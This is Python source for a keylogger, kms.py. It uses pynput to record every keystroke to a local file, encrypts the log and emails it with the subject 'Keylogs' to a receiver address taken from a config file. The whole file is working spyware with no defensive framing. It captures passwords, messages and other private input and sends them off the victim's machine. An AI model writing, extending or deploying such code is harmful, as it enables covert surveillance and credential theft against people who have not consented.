# kms.py
from pynput import keyboard
from utils.logger import write
from utils.crypto import encrypt
from utils.sender import send_email
import yaml
import os

def on_key_press(Key):
    """Handles key press events and writes to log."""
    try:
        if Key == keyboard.Key.enter:
            write("\n")
        else:
            write(Key.char)
    except AttributeError:
        # Handle special keys
        special_keys = {
            keyboard.Key.backspace: "[Backspace]",
            keyboard.Key.tab: "[Tab]",
            keyboard.Key.space: " "
        }
        if Key in special_keys:
            write(special_keys[Key])
        else:
            write(f"[{repr(Key)}]\n")

def on_key_release(Key):
    """Stops listener when Esc is pressed."""
    if Key == keyboard.Key.esc:
        return False

def main():
    # 1️⃣ Start keyboard listener
    with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()

    # 2️⃣ Encrypt log file
    with open("keylogger.txt", 'r') as f:
        log_content = f.read()
        encrypted_content = encrypt(log_content)

    # 3️⃣ Load config template
    with open("config_template.yaml", 'r') as f:
        cfg = yaml.safe_load(f)

    # 4️⃣ Prepare email
    message = f"""From: {cfg['sender']}
To: {cfg['receiver']}
Subject: Keylogs

{encrypted_content.decode()}
"""

    # 5️⃣ Send email securely
    send_email(message)

if __name__ == "__main__":
    main()
